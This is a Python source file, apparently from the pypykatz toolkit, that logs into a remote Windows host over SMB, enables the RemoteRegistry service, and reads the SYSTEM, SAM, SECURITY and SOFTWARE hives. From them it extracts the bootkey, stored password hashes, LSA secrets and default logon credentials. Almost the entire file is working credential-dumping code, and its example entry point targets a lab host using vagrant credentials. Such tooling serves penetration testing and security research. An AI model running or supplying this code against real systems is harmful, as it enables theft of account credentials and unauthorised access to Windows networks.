#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#

import json
import asyncio
from aiosmb.commons.connection.factory import SMBConnectionFactory
from aiosmb.commons.interfaces.machine import SMBMachine
from aiosmb.dcerpc.v5.interfaces.remoteregistry import RRPRPC, SMBWinRegHive

from pypykatz.registry import logger
from pypykatz.commons.common import UniversalEncoder
from pypykatz.registry.sam.asam import *
from pypykatz.registry.security.asecurity import *
from pypykatz.registry.system.asystem import *
from pypykatz.registry.software.asoftware import *

async def print_cb(data):
	print(data)

class RemoteRegistry:
	"""
	This class represents an offline registry
	You will need to set at least the SYSTEM hive (to get bootkey)
	In case you have the SAM and/or SECURITY hives, it will parse them for the stored credentials/secrets as well.
	"""
	def __init__(self, connection, print_cb = print_cb):
		self.print_cb = print_cb
		self.connection = connection
		self.rrprpc = None
		self.sam_hive = None
		self.security_hive = None
		self.system_hive = None
		self.software_hive = None
		
		self.system = None
		self.sam = None
		self.security = None
		self.software = None
	
	@staticmethod
	async def from_url(url:str):
		connection_factory = SMBConnectionFactory.from_url(url)
		connection = connection_factory.get_connection()
		_, err = await connection.login()
		if err is not None:
			raise err

		return await RemoteRegistry.from_smb_connection(connection)
	
	@staticmethod
	async def from_smb_connection(connection):
		po = RemoteRegistry(connection)
		return po
		
	async def get_secrets(self):

		machine = SMBMachine(self.connection)
		await self.print_cb('[+] Enabling RemoteRegistry service...')
		_, err = await machine.enable_service('RemoteRegistry')
		if err is not None:
			raise err
		
		err = None
		for i in range(5):
			await self.print_cb('[+] Waiting for service to start...')
			await asyncio.sleep(4)
			await self.print_cb('[+] Connecting to RemoteRegistry service... Attempt %s' % (i+1))
			self.rrprpc, err = await RRPRPC.from_smbconnection(self.connection)
			if err is not None:
				continue
			break
		else:
			raise Exception('Could not connect to RemoteRegistry service!')
		
		await self.print_cb('[+] Connected to RemoteRegistry service')
		try:
			self.system_hive = SMBWinRegHive(self.rrprpc, 'HKLM\\SYSTEM', print_cb = self.print_cb)
			await self.system_hive.setup()
						
			self.sam_hive = SMBWinRegHive(self.rrprpc, 'HKLM\\SAM', print_cb = self.print_cb)
			await self.sam_hive.setup()
			
			self.security_hive = SMBWinRegHive(self.rrprpc, 'HKLM\\SECURITY', print_cb = self.print_cb)
			await self.security_hive.setup()
			
			self.software_hive = SMBWinRegHive(self.rrprpc, 'HKLM\\SOFTWARE', print_cb = self.print_cb)
			await self.software_hive.setup()

			await self.print_cb('[+] Parsing SYSTEM hive...')
			self.system = SYSTEM(self.system_hive)
			bootkey = await self.system.get_bootkey()

			await self.print_cb('[+] Parsing SAM hive...')
			self.sam = SAM(self.sam_hive, bootkey)
			await self.sam.get_secrets()

			await self.print_cb('[+] Parsing SECURITY hive...')
			self.security = SECURITY(self.security_hive, bootkey, self.system)
			await self.security.get_secrets()
			
			await self.print_cb('[+] Parsing SOFTWARE hive...')
			self.software = SOFTWARE(self.software_hive, bootkey)
			await self.software.get_default_logon()

			if self.software.default_logon_user is not None:
				self.security.set_default_user(self.software.default_logon_user, self.software.default_logon_domain)

		except Exception as e:
			import traceback
			traceback.print_exc()
			raise e
		finally:
			await self.print_cb('[+] Closing remote hives...')
			for hive in [self.system_hive, self.sam_hive, self.security_hive, self.software_hive]:
				try:
					await hive.close()
				except:
					pass
			await self.print_cb('[+] Done!')
		
	def to_file(self, file_path, json_format = False):
		with open(file_path, 'a', newline = '') as f:
			if json_format == False:
				f.write(str(self))
			else:
				f.write(self.to_json())
	
	def to_json(self):
		return json.dumps(self.to_dict(), cls = UniversalEncoder, indent=4, sort_keys=True)
			
	def to_dict(self):
		t = {}
		t['SYSTEM'] = self.system.to_dict()
		if self.sam:
			t['SAM'] = self.sam.to_dict()
		if self.security:
			t['SECURITY'] = self.security.to_dict()
		if self.software:
			t['SOFTWARE'] = self.software.to_dict()
		return t
		
		
	def __str__(self):
		t = str(self.system)
		if self.sam:
			t += str(self.sam)
		if self.security:
			t += str(self.security)
		if self.software:
			t += str(self.software)
		return t

async def amain():
	import logging
	logger.setLevel(logging.DEBUG)
	url = 'smb2+ntlm-password://vagrant:vagrant@192.168.56.11'
	po = await RemoteRegistry.from_url(url)
	await po.get_secrets()
	print(str(po))

def main():
	import asyncio
	asyncio.run(amain())
	
if __name__ == '__main__':
	main()